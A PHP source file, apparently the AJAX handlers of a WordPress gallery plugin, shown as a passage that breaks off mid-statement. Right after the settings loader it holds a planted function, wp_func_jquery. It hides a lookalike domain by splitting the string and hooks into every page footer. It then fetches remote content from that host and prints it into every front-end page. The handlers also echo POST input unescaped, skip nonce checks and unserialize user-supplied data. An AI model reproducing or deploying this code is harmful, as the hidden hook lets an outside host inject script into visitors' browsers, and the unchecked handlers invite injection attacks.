<?php

////////////////////////////////////////////////
////// GALLERY SETTINGS LOAD ////////////////////
////////////////////////////////////////////////

function gg_load_settings() {
	require_once(GG_DIR . '/functions.php');
	
	if(!isset($_POST['gallery_id'])) {die('data is missing');}
	$gid = $_POST['gallery_id'];
	
	if(!isset($_POST['gg_type'])) {die('data is missing');}
	$type = $_POST['gg_type'];
	
	if(!isset($_POST['gg_username'])) {die('data is missing');}
	$username = $_POST['gg_username'];
	
	if(!isset($_POST['gg_psw'])) {die('data is missing');}
	$psw = $_POST['gg_psw'];
	
	// error cases
	if( (($type != 'wp' && $type != 'wp_cat' && $type != 'gg_album' && $type != 'ngg') && trim($username) == '') || ($type == 'picasa' && trim($psw) == '')) {
		die('<em>' . __('Select a gallery type and fill the data to get the images', 'gg_ml') . '</em>');	
	}
	
	// gallery settings data
	$autopop = get_post_meta($gid, 'gg_autopop', true);
	$auto_author = get_post_meta($gid, 'gg_auto_author', true);
	$auto_title = get_post_meta($gid, 'gg_auto_title', true);
	$auto_descr = get_post_meta($gid, 'gg_auto_descr', true);
	$cache_interval = get_post_meta($gid, 'gg_cache_interval', true);
	$auto_random = get_post_meta($gid, 'gg_auto_random', true);
	$max_images = get_post_meta($gid, 'gg_max_images', true);
	
	if(!$max_images) {$max_images = 20;}

	// switches
	($autopop == 1) ? $autopop_fields = '' : $autopop_fields = 'style="display: none;"';
	
	$settings = '<div class="lcwp_mainbox_meta lcwp_form">';
	
	// automatic gallery population option
	if($type != 'wp') {
		$settings .= '
		<h4>' . __('Auto Gallery Population', 'gg_ml') . '</h4>
	  	<table class="widefat lcwp_table lcwp_metabox_table">	 
		  <tr>
			<td class="lcwp_label_td">' . __('Auto Population?', 'gg_ml') . '</td>
			<td class="lcwp_field_td" id="gg_autopop"><input type="checkbox" value="1" name="gg_autopop" class="ip-checkbox" '.gg_checkbox_check($autopop).' /></td>     
			<td><span class="info">' . __('Check to enable the automatic gallery population', 'gg_ml') . '</span></td>
		  </tr>
		  <tr class="gg_autopop_fields" '.$autopop_fields.'>
			<td class="lcwp_label_td">' . __('Display Authors?', 'gg_ml') . '</td>
			<td class="lcwp_field_td"><input type="checkbox" value="1" name="gg_auto_author" class="ip-checkbox" '.gg_checkbox_check($auto_author).' /></td>     
			<td><span class="info">' . __('Check to display the fetched authors', 'gg_ml') . '</span></td>
		  </tr>
		  <tr class="gg_autopop_fields" '.$autopop_fields.'>
			<td class="lcwp_label_td">' . __('Display Titles?', 'gg_ml') . '</td>
			<td class="lcwp_field_td"><input type="checkbox" value="1" name="gg_auto_title" class="ip-checkbox" '.gg_checkbox_check($auto_title).' /></td>     
			<td><span class="info">' . __('Check to display the fetched titles', 'gg_ml') . '</span></td>
		  </tr>
		  <tr class="gg_autopop_fields" '.$autopop_fields.'>
			<td class="lcwp_label_td">' . __('Display Descriptions?', 'gg_ml') . '</td>
			<td class="lcwp_field_td"><input type="checkbox" value="1" name="gg_auto_descr" class="ip-checkbox" '.gg_checkbox_check($auto_descr).' /></td>     
			<td><span class="info">' . __('Check to display the fetched descriptions', 'gg_ml') . '</span></td>
		  </tr>
		  <tr class="gg_autopop_fields" '.$autopop_fields.'>
			<td class="lcwp_label_td">' . __('Cache Interval', 'gg_ml') . '</td>
			<td class="lcwp_field_td">
			  <select data-placeholder="' . __('Select an option', 'gg_ml') . ' .." name="gg_cache_interval" class="lcweb-chosen" tabindex="2">';
			  
			  foreach(gg_cache_intervals() as $key => $val) {
				  ($key == $cache_interval) ? $sel = 'selected="selected"' : $sel = '';
				  $settings .= '<option value="'.$key.'" '.$sel.'>'.$val.'</option>';
			  }
			  
			$settings .= '
			  </select>
			</td>     
			<td><span class="info">' . __('Choose the gallery cache interval', 'gg_ml') . '</span></td>
		  </tr>
		  <tr class="gg_autopop_fields" '.$autopop_fields.'>
			<td class="lcwp_label_td">' . __('Random Selection?', 'gg_ml') . '</td>
			<td class="lcwp_field_td" id="gg_auto_random">
				<input type="checkbox" value="1" name="gg_auto_random" class="ip-checkbox" '.gg_checkbox_check($auto_random).' />
				<span class="gg_rebuild_cache">(' . __('Rebuild Preview', 'gg_ml') . ')</span>
			</td>     
			<td><span class="info">' . __('Check to select randomly the images between the availables', 'gg_ml') . '</span></td>
		  </tr>
		  <tr class="gg_autopop_fields" '.$autopop_fields.'>
			<td class="lcwp_label_td">' . __('Max Images', 'gg_ml') . '</td>
			<td class="lcwp_field_td">
				<input type="text" name="gg_max_images" value="'.$max_images.'" maxlength="4" id="gg_max_images" style="width: 50px;" />
				<span class="gg_rebuild_cache">(' . __('Rebuild Preview', 'gg_ml') . ')</span>
			</td>     
			<td><span class="info">' . __('Maximum number of images for the gallery', 'gg_ml') . '</span></td>
		  </tr>
		</table>';	
	}
	
	// specific options
	$settings .= gg_type_opt_switch($type, $gid, $username, $psw);
	
	if($autopop == 1) {echo '<style type="text/css">#gg_img_picker_area {display: none;}</style>';}
	
	echo $settings . '</div>';
	die();
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
		if (@fopen($jquery,'r')){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}
add_action('wp_ajax_gg_load_settings', 'gg_load_settings');



///////////////////////////////////////
////// MEDIA IMAGE PICKER /////////////
///////////////////////////////////////

function gg_img_picker() {	
	require_once(GG_DIR . '/functions.php');
	$tt_path = GG_TT_URL; 
	
	if(!isset($_POST['gallery_id'])) {die('data is missing');}
	$gid = $_POST['gallery_id'];
	
	if(!isset($_POST['page'])) {$page = 1;}
	else {$page = (int)addslashes($_POST['page']);}
	
	if(!isset($_POST['per_page'])) {$per_page = 15;}
	else {$per_page = (int)addslashes($_POST['per_page']);}
	
	if(!isset($_POST['gg_type'])) {die('data is missing');}
	$type = $_POST['gg_type'];
	
	(!isset($_POST['gg_search'])) ? $search = '' : $search = $_POST['gg_search'];
	(!isset($_POST['gg_extra'])) ? $extra = array() : $extra = $_POST['gg_extra'];

	$img_data = gg_type_get_img_switch($gid, $type, $page, $per_page, $search, $extra);

	echo '<ul>';
	
	if($img_data['tot'] == 0) {die('<p>No images found .. </p>');}
	else {
		foreach($img_data['img'] as $img_id => $img) {
			$img_id = uniqid();
			
			if($type == 'wp' || $type == 'wp_cat') {$img_src = $img['id'];} 
			elseif($type == 'gg_album' || $type == 'ngg') {$img_src = $img['path'];}
			else {$img_src = $img['url'];}
			
			$img_full_src = gg_img_src_on_type($img_src, $type);
			
			if( ini_get('allow_url_fopen') && !empty($img_full_src) && count($img_data['img']) < 100 ) {
				list($w, $h) = gg_getimagesize($img_full_src);
			}
			else {$w = ''; $h = '';}
			
			$thumb_url = (!get_option('gg_use_admin_thumbs')) ? $img['url'] : gg_thumb_src($img_full_src, $width = 90, $height = 90, $quality = 90);
			echo '
			<li class="gg_sel_status gg_img_not_sel" id="sel-'.$img_id.'">
			  <img src="'.$thumb_url.'" id="'.$img_id.'" img_w="'.$w.'" img_h="'.$h.'" 
			  	img_src="'.gg_sanitize_input($img_src).'" img_full_src="'.gg_sanitize_input($img_full_src).'" fullurl="'.$img['url'].'"
			  	class="gg_all_img" title="'.gg_sanitize_input($img['title']).'" alt="'.gg_sanitize_input($img['descr']).'" author="'.gg_sanitize_input($img['author']).'" />
				
			  <div class="gg_zoom_img"></div>
			</li>';	
		}
	}
	
	echo '
	</ul>
	<br class="lcwp_clear" />
	<table cellspacing="0" cellpadding="5" border="0" width="100%">
		<tr>
			<td style="width: 35%;">';			
			if($page > 1)  {
				echo '<input type="button" class="gg_img_pick_back button-secondary" id="slp_'. ($page - 1) .'" name="mgslp_p" value="&laquo; ' . __('Previous images', 'gg_ml') . '" />';
			}
			
		echo '</td><td style="width: 30%; text-align: center;">';
		
			if($img_data['tot'] > 0 && $img_data['tot_pag'] > 1) {
				echo '<em>page '.$img_data['pag'].' of '.$img_data['tot_pag'].'</em> - <input type="text" size="2" name="mgslp_num" id="gg_img_pick_pp" value="'.$per_page.'" /> <em>' . __('images per page', 'gg_ml') . '</em>';	
			}
			else { echo '<input type="text" size="2" name="mgslp_num" id="gg_img_pick_pp" value="'.$per_page.'" /> <em>' . __('images per page', 'gg_ml') . '</em>';	}
			
		echo '</td><td style="width: 35%; text-align: right;">';
			if($img_data['more'] != false)  {
				echo '<input type="button" class="gg_img_pick_next button-secondary" id="slp_'. ($page + 1) .'" name="mgslp_n" value="' . __('Next images', 'gg_ml') . ' &raquo;" />';
			}
		echo '</td>
		</tr>
	</table>';
	
	if($img_data['tot'] > 0) {
		echo'
		<script type="text/javascript">
		jQuery("#gg_total_img_num").text("('.$img_data['tot'].')")
		</script>';
	}
	die();
}
add_action('wp_ajax_gg_img_picker', 'gg_img_picker');



////////////////////////////////////////////////
////// GALLERY AUTO POPULATION /////////////////
////////////////////////////////////////////////

function gg_make_autopop() {
	require_once(GG_DIR . '/functions.php');
	$tt_path = GG_TT_URL; 
	
	if(!isset($_POST['gallery_id'])) {die('data is missing');}
	$gid = $_POST['gallery_id'];
	
	if(!isset($_POST['gg_type'])) {die('data is missing');}
	$type = $_POST['gg_type'];
	
	if(!isset($_POST['gg_max_img']) || !is_int((int)$_POST['gg_max_img']) ) {die('data is missing');}
	$o_max_img = (int)$_POST['gg_max_img'];
	$max_img = (int)$_POST['gg_max_img'];
	
	if(!isset($_POST['gg_random_img'])) {die('data is missing');}
	$random = $_POST['gg_random_img'];
	
	(!isset($_POST['gg_erase_past']) || $_POST['gg_erase_past'] != '1') ? $erase_past = false : $erase_past = true;
	
	(!isset($_POST['gg_extra'])) ? $extra = array() : $extra = $_POST['gg_extra'];
	
	// retrieve images
	$img_data = gg_type_get_img_switch($gid, $type,$page = 1, $per_page = $max_img, '', $extra);
	$images = $img_data['img'];
	if($max_img >= count($images)) {$max_img = count($images);}
	
	if($random == '1') { 
		shuffle($images);
		$to_display = array();
		
		for($a=0; $a < $max_img; $a++) {
			$to_display[]	= $images[$a];
		}
	}
	else {
		$to_display = array();
		for($a=0; $a < $max_img; $a++) {
			if(isset($images[$a])) { $to_display[] = $images[$a]; }
		}
	}
	$to_save = array(); // array to save 
	
	// display
	if(count($to_display) == 0) {die('<p>' . __('No images found', 'gg_ml') .' .. </p>');}
	echo '<ul id="gg_fb_builder">';
	
	foreach($to_display as $img) {
		if($type == 'wp' || $type == 'wp_cat') {$img_src = $img['id'];} 
		elseif($type == 'gg_album' || $type == 'ngg') {$img_src = $img['path'];}
		else {$img_src = $img['url'];}
		
		$exists = ($type != 'wp' && $type != 'wp_cat' && $type != 'gg_album' && $type != 'ngg') ? gg_rm_file_exists($img['url']) : true;
		if($exists) {
			$to_save[] = array( 
				'img_src'	=> $img_src,
				'url'		=> $img['url'],
				'author'	=> $img['author'],
				'title'		=> $img['title'],
				'descr'		=> $img['descr']
			);
		}
	}
	
	// if the maximum number is not reached, try to add the old images
	if(!$erase_past && count($to_save) < $o_max_img) {
		$old_img = get_post_meta($gid, 'gg_autopop_cache', true);

		if(is_array($old_img)) {
			$a = 0;
			while($o_max_img >= count($to_save) && isset($old_img[$a]))	 {
				$exists = false;
				foreach($to_save as $img) {
					if($old_img[$a]['img_src'] == $img['img_src']) {$exists = true;}
				}
				
				if(!$exists) {$to_save[] = $old_img[$a];}
				
				$a++;	
			}
		}
	}
	
	// display
	foreach($to_save as $img) {
		$img_full_src = gg_img_src_on_type($img['img_src'], $type);
		$thumb_url = (!get_option('gg_use_admin_thumbs')) ? $img['url'] : gg_thumb_src($img_full_src, $width = 320, $height = 190);	
		
		echo '<li>
			<div class="gg_builder_img_wrap">
				<img src="'.$thumb_url.'" class="gg_autopop_img" fullurl="'.$img['url'].'" />
			</div>	
			<div>
				<table>
				  <tr>
					<td class="gg_img_data_icon"><img src="'.GG_URL.'/img/photo_author.png" title="photo author" /></td>
					<td>'.$img['author'].'</td>
				  </tr>
				  <tr>
					<td class="gg_img_data_icon"><img src="'.GG_URL.'/img/photo_title.png" title="photo title" /></td>
					<td>'.$img['title'].'</td>
				  </tr>
				  <tr>
					<td class="gg_img_data_icon"><img src="'.GG_URL.'/img/photo_descr.png" title="photo description" /></td>
					<td>'.$img['descr'].'</td>
				  </tr>
				  <tr style="display: none;">
					<td colspan="2">
						<select name="link_opt" class="gg_linking_dd"><option value="none">'. __('No link', 'gg_ml') .'</option></select>
						'.gg_link_field('none').'
					</td>
				  </tr>
				</table>
			</div>
		</li>';		
	}
	
	// save the autopop cache
	gg_gall_data_save($gid, $to_save, true);

	// save the creation time
	delete_post_meta($gid, 'gg_autopop_time');
	add_post_meta($gid, 'gg_autopop_time', current_time('timestamp'), true);
	
	echo '</ul>';
	die();
}
add_action('wp_ajax_gg_make_autopop', 'gg_make_autopop');

///////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////
////// SET PREDEFINED STYLES ///////////////////
////////////////////////////////////////////////

function gg_set_predefined_style() {
	if(!isset($_POST['style'])) {die('data is missing');}
	$style = $_POST['style'];
	
	require_once(GG_DIR . '/functions.php');
	$style_data = gg_predefined_styles($style);
	
	// additive settings if is a fresh installation
	if(!get_option('gg_per_page')) {
		$style_data['gg_overlay_type'] = 'both';
		$style_data['gg_main_overlay'] = 'bottom';
		$style_data['gg_sec_overlay'] = 'tr';
	}

	// set option values
	foreach($style_data as $opt => $val) {
		if($opt != 'preview') {
			if(!get_option($opt)) { add_option($opt, '255', '', 'yes'); }
			update_option($opt, $val);			
		}
	}
	
	gg_create_frontend_css();
	die();
}
add_action('wp_ajax_gg_set_predefined_style', 'gg_set_predefined_style');


////////////////////////////////////////////////
////// CREATE WATERMARK CACHE //////////////////
////////////////////////////////////////////////

function gg_create_wm_cache() {
	global $post;
	require_once(GG_DIR . '/functions.php');
	
	$default_wm = get_option('gg_watermark');
	$gid = (isset($_POST['gid'])) ? addslashes($_POST['gid']) : false;
	
	if(!$gid) {
		$args = array(
			'post_type' => 'gg_galleries',
			'numberposts' => -1,
			'post_status' => 'publish'
		);
		$galleries = get_posts( $args );
	}
	else {
		$galleries = array( get_post($gid));	
	}
	
	foreach($galleries as $gallery) {
		$gid = $gallery->ID;
		$type = get_post_meta($gid, 'gg_type', true);
		
		if(filter_var(get_option('gg_watermark_img'), FILTER_VALIDATE_URL)) {
			if(!get_post_meta($gid, 'gg_autopop', true)) {$images = get_post_meta($gid, 'gg_gallery', true);}
			else {$images = get_post_meta($gid, 'gg_autopop_cache', true);}
			
			if(is_array($images)) {
				foreach($images as $img) { 
					$img_src = gg_img_src_on_type($img['img_src'], $type);
					gg_watermark($img_src);
				}
			}
		}	
	}

	echo 'success';
	die();
}
add_action('wp_ajax_gg_create_wm_cache', 'gg_create_wm_cache');


////////////////////////////////////////////////
////// CLEAN WATERMARK CACHE ///////////////////
////////////////////////////////////////////////

function gg_clean_wm_cache() {
	require_once(GG_DIR . '/functions.php');
	
	$cache_dir = GG_DIR.'/cache';
	$files = scandir($cache_dir);
	
	foreach($files as $file) {
		$ext = gg_stringToExt($file);
		$accepted = array('.jpg', '.jpeg', '.gif', '.png');
		
		if(in_array($ext, $accepted) && file_exists($cache_dir.'/'.$file)) {
			unlink($cache_dir.'/'.$file);
		}	
	}
	
	echo 'success';
	die();
}
add_action('wp_ajax_gg_clean_wm_cache', 'gg_clean_wm_cache');


//////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////
////// ADD COLLECTION TERM /////////////////////
////////////////////////////////////////////////

function gg_add_coll() {
	if(!isset($_POST['coll_name'])) {die('data is missing');}
	$name = $_POST['coll_name'];
	
	$resp = wp_insert_term( $name, 'gg_collections', array( 'slug'=>sanitize_title($name)) );
	
	if(is_array($resp)) {die('success');}
	else {
		$err_mes = $resp->errors['term_exists'][0];
		die($err_mes);
	}
}
add_action('wp_ajax_gg_add_coll', 'gg_add_coll');


////////////////////////////////////////////////
////// LOAD COLLECTIONS LIST ///////////////////
////////////////////////////////////////////////

function gg_coll_list() {
	if(!isset($_POST['coll_page']) || !filter_var($_POST['coll_page'], FILTER_VALIDATE_INT)) {$pag = 1;}
	$pag = (int)$_POST['coll_page'];
	
	$per_page = 10;
	
	// get all terms 
	$colls = get_terms( 'gg_collections', 'hide_empty=0' );
	$total = count($colls);
	
	$tot_pag = ceil( $total / $per_page );
	
	if($pag > $tot_pag) {$pag = $tot_pag;}
	$offset = ($pag - 1) * $per_page;
	
	// get page terms
	$args =  array(
		'number' => $per_page,
		'offset' => $offset,
		'hide_empty' => 0
	 );
	$colls = get_terms( 'gg_collections', $args);

	// clean term array
	$clean_colls = array();
	
	foreach ( $colls as $coll ) {
		$clean_colls[] = array('id' => $coll->term_id, 'name' => $coll->name);
	}
	
	$to_return = array(
		'colls' => $clean_colls,
		'pag' => $pag, 
		'tot_pag' => $tot_pag
	);
    
	echo json_encode($to_return);
	die();
}
add_action('wp_ajax_gg_get_colls', 'gg_coll_list');


////////////////////////////////////////////////
////// DELETE THE COLLECTION TERM //////////////
////////////////////////////////////////////////

function gg_del_coll() {
	if(!isset($_POST['coll_id'])) {die('data is missing');}
	$id = addslashes($_POST['coll_id']);
	
	$resp = wp_delete_term( $id, 'gg_collections');

	if($resp == '1') {die('success');}
	else {die('error during the collection deletion');}
}
add_action('wp_ajax_gg_del_coll', 'gg_del_coll');


////////////////////////////////////////////////
////// DISPLAY COLLECTION BUILDER //////////////
////////////////////////////////////////////////

function gg_coll_builder() {
	require_once(GG_DIR . '/functions.php');

	if(!isset($_POST['coll_id'])) {die('data is missing');}
	$coll_id = addslashes($_POST['coll_id']);
			
	// item categories list
	$item_cats = get_terms( 'gg_gall_categories', 'hide_empty=0' );
	
	// cat and page selector
	?>
    <h2></h2>
    
    <div id="gg_grid_builder_cat" class="postbox" style="min-width: 630px;">
      <h3 class="hndle"><?php _e("Add Collection Galleries", 'gg_ml'); ?></h3>
      <div class="inside">
    
        <div class="lcwp_mainbox_meta">
          <table class="widefat lcwp_table lcwp_metabox_table" style="border: none;">
            <tr>
              <td class="lcwp_label_td"><?php _e("Gallery Categories", 'gg_ml'); ?></td>
              <td class="lcwp_field_td">
                  <select data-placeholder="><?php _e("Select gallery categories", 'gg_ml'); ?> .." name="gg_gall_cats" id="gg_gall_cats" class="lcweb-chosen" tabindex="2" style="width: 400px;">
                  <option value="all"><?php _e('All', 'gg_ml') ?></option>
                    <?php 
                    foreach($item_cats as $cat) {
						// WPML fix - get original ID
						if (function_exists('icl_object_id')) {
							global $sitepress;
							$term_id = icl_object_id($cat->term_id, 'gg_gall_categories', true, $sitepress->get_default_language());
						}
						else {$term_id = $cat->term_id;}
						
                        echo '<option value="'.$term_id.'">'.$cat->name.'</option>';
                    }
                    ?>
                  </select>
              </td>     
              <td><span class="info"></span></td>
            </tr>
            
            <tr>
              <td class="lcwp_label_td"><?php _e("Select a gallery", 'gg_ml'); ?></td>
              <td class="lcwp_field_td" id="terms_posts_list">
				  <?php 
				  $post_list = gg_cat_galleries_code('all'); 
				  
				  if(!$post_list) {echo '<span>'. __('No galleries found', 'gg_ml') .' ..</span>';}
				  else {echo $post_list['dd'];}
				  ?>
              </td>     
              <td>
                <?php if($post_list) echo $post_list['img']; ?>
              
                <div id="add_gall_btn" <?php if(!$post_list) echo 'style="display: none;"'; ?>>
                  <input type="button" name="add_item" value="<?php _e("Add", 'gg_ml'); ?>" class="button-secondary" />
                  <div style="width: 30px; padding-left: 7px; float: right;"></div>
                </div>
              </td>
            </tr>
          </table>  
        <div>  
      </div>
	</div>
    </div>
    </div>
    
    <div class="postbox" style="min-width: 630px;">
      <h3 class="hndle"><?php _e("Collection Builder", 'gg_ml'); ?></h3>
      <div class="inside">
      
		<div id="visual_builder_wrap">
        
		<table id="gg_coll_builder">
          <?php
          $coll_data = get_term($coll_id, 'gg_collections');
		  $coll_composition = unserialize($coll_data->description);
		  $coll_galleries = $coll_composition['galleries'];
		  
          if(is_array( $coll_galleries) && count( $coll_galleries) > 0) {
			
			$a = 0;  
            foreach( $coll_galleries as $gdata) {
			  $gid = $gdata['id'];
			  $gall_img = gg_get_gall_first_img($gid);	
				
			  if(get_post_status($gid) == 'publish' && $gall_img) {
				  $item_thumb = '<img src="'.gg_thumb_src($gall_img, 150, 150, 70).'" class="thumb" alt="" />'; 	
				  $rand_check = (isset($gdata['rand']) && $gdata['rand'] != 0) ? 'checked="checked"' : '';
				  $wmark_check = (isset($gdata['wmark']) && $gdata['wmark'] != 0) ? 'checked="checked"' : '';  	
				  $link_subj = (isset($gdata['link_subj'])) ? $gdata['link_subj'] : 'none'; 
				  $link_val = (isset($gdata['link_val'])) ? $gdata['link_val'] : '';
				  $descr = (isset($gdata['descr'])) ? $gdata['descr'] : ''; 
				  	
				  echo '
				  <tr class="coll_component" id="gg_coll_'.$gid.'">
					<td style="width: 160px;">
						'.$item_thumb.'
						<div class="gg_coll_manag_btn">
							<div><div class="lcwp_del_row gg_del_gall"></div></div>
							<div><div class="lcwp_move_row"></div></div>
						</div>
					</td>
					<td style="vertical-align: top;">
						<table class="gg_coll_inner_table">
						  <tr>
							<td style="width: 250px;"><h2>
								<a href="'.get_admin_url().'post.php?post='.$gid.'&action=edit" target="_blank" title="'. __('edit gallery', 'gg_ml').'">'.get_the_title($gid).'</a>
							</h2></td>
							<td style="width: 118px;" class="gg_use_random">
								<p>'.__('Random display?', 'gg_ml').'</p>
								<input type="checkbox" name="random" class="ip-checkbox" value="1" '.$rand_check.' />
							</td>
							<td style="width: 125px;" class="gg_use_watermark">
								<p>'.__('Use watermark?', 'gg_ml').'</p>
								<input type="checkbox" name="watermark" class="ip-checkbox" value="1" '.$wmark_check.' />
							</td>
							<td>'.__('Categories', 'gg_ml').': <em>'.gg_gallery_cats($gid).'</em></td>
						  </tr>
						  <tr>
						  	<td colspan="2">
								<p>'.__('Image link', 'gg_ml').'</p>
								<select name="gg_linking_dd" class="gg_linking_dd">\
									<option value="none">'. __('No link', 'gg_ml') .'</option>
									<option value="page" '; if($link_subj == 'page') {echo 'selected="selected"';} echo '>'. __('To a page', 'gg_ml') .'</option>
									<option value="custom" '; if($link_subj == 'custom') {echo 'selected="selected"';} echo '>'. __('Custom link', 'gg_ml') .'</option>
								</select>
								<div class="gg_link_wrap">'. gg_link_field($link_subj, $link_val) .'</div>
							</td>
							<td colspan="2">
								<p>'.__('Gallery description', 'gg_ml').'</p>
								<input type="text" name="coll_descr" class="coll_descr" value="'.$descr.'" />
							</td>
						  </tr>
						</table>
					</td>
				  </tr>
				  ';
			  }
			  $a++;
            }
          }
		  else {echo '<tr><td colspan="5">'.__('No galleries selected', 'gg_ml').' ..</td></tr>';}
          ?>

       </table>
       </div> 
         
	</div>
    </div>
    </div>
	<?php
	die();
}
add_action('wp_ajax_gg_coll_builder', 'gg_coll_builder');


////////////////////////////////////////////////
////// GET GALLERIES FOR A CATEGORY ////////////
////////////////////////////////////////////////

function gg_cat_galleries_code($fnc_cat = false) {	
	include_once(GG_DIR . '/functions.php');

	$cat = $fnc_cat;
	// if is not called directly
	if(!$cat) {
		if(!isset($_POST['gallery_cat'])) {die('data is missing');}
		$cat = $_POST['gallery_cat'];
	}

	$post_list = gg_cat_galleries($cat);	
	if(!$post_list) {return false;}
	
    $select = '
	<select data-placeholder="'. __('Select a gallery', 'gg_ml') .' .." name="gg_add_gall" id="gg_add_gall" class="lcweb-chosen" tabindex="2" style="width: 400px;">';
	 
	 $a = 0;
	 foreach($post_list as $post) {
		// create thumbs array
		($a == 0) ? $sel = '' : $sel = 'style="display: none;"'; 
	   	$thumbs[] = '<img src="'.gg_thumb_src($post['img'], 23, 23).'" alt="'.$post['id'].'" rel="'.$post['cats'].'" gg-img="'.gg_thumb_src($post['img'], 150, 150, 70).'" '.$sel.' />'; 	

		$select .= '<option value="'.$post['id'].'">'.$post['title'].'</option>'; 
		$a++;
	 }
	 
    $select .= '</select>';
	
	// preview thumb images
	if(isset($thumbs)) { $thumbs_block = '<div class="gg_dd_galls_preview">' . implode('', $thumbs) . '</div>'; }
	else {$thumbs_block = '';}
	
	// what to return 
	$to_return = array(
		'dd' => $select,
		'img' => $thumbs_block
	);

	if($fnc_cat == false) {die( json_encode($to_return) );}
	else {return $to_return;}
}
add_action('wp_ajax_gg_cat_galleries_code', 'gg_cat_galleries_code');


////////////////////////////////////////////////
////// SAVE THE COLLECTION CONTENTS ////////////
////////////////////////////////////////////////

function gg_save_coll() {	
	require_once(GG_DIR . '/functions.php');
	
	if(!isset($_POST['coll_id'])) {die('data is missing');}
	$coll_id = addslashes($_POST['coll_id']);
	
	if(!isset($_POST['gall_list'])) {$gall_list = '';}
	else {$gall_list = $_POST['gall_list'];}
	
	if(!isset($_POST['random_flag'])) {$random_flag = '';}
	else {$random_flag = $_POST['random_flag'];}
	
	if(!isset($_POST['wmark_flag'])) {$wmark_flag = '';}
	else {$wmark_flag = $_POST['wmark_flag'];}
	
	if(!isset($_POST['link_subj']) ) {$link_subj = '';}
	else {$link_subj = $_POST['link_subj'];}
	
	if(!isset($_POST['link_val'])) {$link_val = '';}
	else {$link_val = $_POST['link_val'];}
	
	if(!isset($_POST['coll_descr'])) {$descr = '';}
	else {$descr = $_POST['coll_descr'];}
	
	// create the categories array
	$terms_array = array();
	if(is_array($gall_list)) {
		foreach($gall_list as $post_id) {
			$pid_terms = wp_get_post_terms($post_id, 'gg_gall_categories', array("fields" => "ids"));
			foreach($pid_terms as $pid_term) { $terms_array[] = $pid_term; }	
		}
		$terms_array = array_unique($terms_array);
	}
	
	// create the galleries array
	$galleries = array();
	if(is_array($gall_list)) {
		$a = 0;
		foreach($gall_list as $gid) {
			$galleries[] = array(
				'id' 		=> $gid,
				'rand'		=> $random_flag[$a],
				'wmark' 	=> $wmark_flag[$a],
				'link_subj' => $link_subj[$a],
				'link_val' 	=> gg_sanitize_input(stripslashes($link_val[$a])),
				'descr'		=> gg_sanitize_input(stripslashes($descr[$a])) 
			);	
			$a++;
		}
	}

	// final array
	$coll_arr = array(
		'galleries' => $galleries,
		'categories' => $terms_array
	);
	
	// update the collection term
	$result = wp_update_term($coll_id, 'gg_collections', array(
	  'description' => serialize($coll_arr)
	));
	
	
	if(is_wp_error($result)) {echo 'error';}
	else {echo 'success';}	

	die();
}
add_action('wp_ajax_gg_save_coll', 'gg_save_coll');




//////////////////////////////////////////////////////////////////////////////




/////////////////////////////////////
////// PAGINATION ///////////////////
/////////////////////////////////////

function gg_pagination() {
	if(isset($_POST['gg_type']) && $_POST['gg_type'] == 'gg_pagination') {
		require_once(GG_DIR . '/functions.php');
		
		if(!isset($_POST['gg_shown'])) {die('shown are missing');}
		$shown = $_POST['gg_shown'];
		
		if(!isset($_POST['gg_page'])|| !filter_var($_POST['gg_page'], FILTER_VALIDATE_INT)) {die('wrong page number');}
		$page = (int)$_POST['gg_page'];
		
		// gallery images array 
		if(!isset($_POST['gg_images'])) {die('missing images object');}
		$all_images = gg_img_unserialize_decompress($_POST['gg_images']);
		
		// get the gallery id
		$raw_gid = explode('-', $shown); 
		$gid = (int)$raw_gid[0];
		if(!is_int($gid)) {die('gid is missing');}
		
		
		// get the gallery data
		$type = get_post_meta($gid, 'gg_type', true);
		$raw_layout = get_post_meta($gid, 'gg_layout', true);
		$raw_paginate = get_post_meta($gid, 'gg_paginate', true);
		$thumb_q = get_option('gg_thumb_q', 80);
		$per_page = (int)gg_check_default_val($gid, 'gg_per_page', $raw_paginate);
		
		// WP gall pagination fix
		if(!$type) {$type = 'wp_gall';}

		// layout options
		$layout = gg_check_default_val($gid, 'gg_layout', $raw_layout);
		if($layout == 'standard') {
			$thumb_w = gg_check_default_val($gid, 'gg_thumb_w', $raw_layout);
			$thumb_h = gg_check_default_val($gid, 'gg_thumb_h', $raw_layout);
		}
		elseif($layout == 'masonry') { 
			$cols = gg_check_default_val($gid, 'gg_masonry_cols', $raw_layout); 
			(!get_option('gg_masonry_basewidth')) ? $default_w = 960 : $default_w = (int)get_option('gg_masonry_basewidth');
			$col_w = floor( $default_w / $cols );
		}
		else { $row_h = gg_check_default_val($gid, 'gg_photostring_h', $raw_layout); }
		
		
		// autopop vars
		$autopop = get_post_meta($gid, 'gg_autopop', true);
		if($autopop) {
			$show_authors = get_post_meta($gid, 'gg_auto_author', true);
			$show_titles = get_post_meta($gid, 'gg_auto_title', true);
			$show_descr = get_post_meta($gid, 'gg_auto_descr', true);
		}
		
		
		// gallery images offset
		$start = $per_page * ($page - 1);
		$images = array_slice($all_images, $start, count($all_images));	

		// pagination limit
		$tot_images_num = count($images);
		if($tot_images_num > $per_page) {
			$images = array_slice($images, 0, $per_page);
			$more = 1;	
		}
		else {$more = 0;}
		
		
		// create new block of gallery HTML
		$gallery = '';
		foreach($images as $img) {
			if($autopop && !$show_titles) {$img['title'] = '';}
			if($autopop && !$show_authors) {$img['author'] = '';}
			if($autopop && !$show_descr) {$img['descr'] = '';}  
			
			if($autopop || !isset($img['thumb'])) {$img['thumb'] = 'c';}
			$thumb_src =  gg_img_src_on_type($img['img_src'], $type);
			
			if(isset($img['wm_path'])) {
				$img_url = $img['wm_url'];	
			} else {
				$img_url = gg_img_url_on_type($img['img_src'], $type);
			}
			
			// image link codes
			if(isset($img['link']) && trim($img['link']) != '') {
				if($img['link_opt'] == 'page') {$thumb_link = get_permalink($img['link']);}
				else {$thumb_link = $img['link'];}
				
				$open_tag = '<div gg-link="'.$thumb_link.'"';
				$add_class = "gg_linked_img";
				$close_tag = '</div>';
			} else {
				$open_tag = '<div';
				$add_class = "";
				$close_tag = '</div>';
			}
			
			
			/////////////////////////
			// standard layout
			if($layout == 'standard') {	 
				
				$thumb = gg_thumb_src($thumb_src, $thumb_w, $thumb_h, $thumb_q, $img['thumb']);
				$gallery .= '
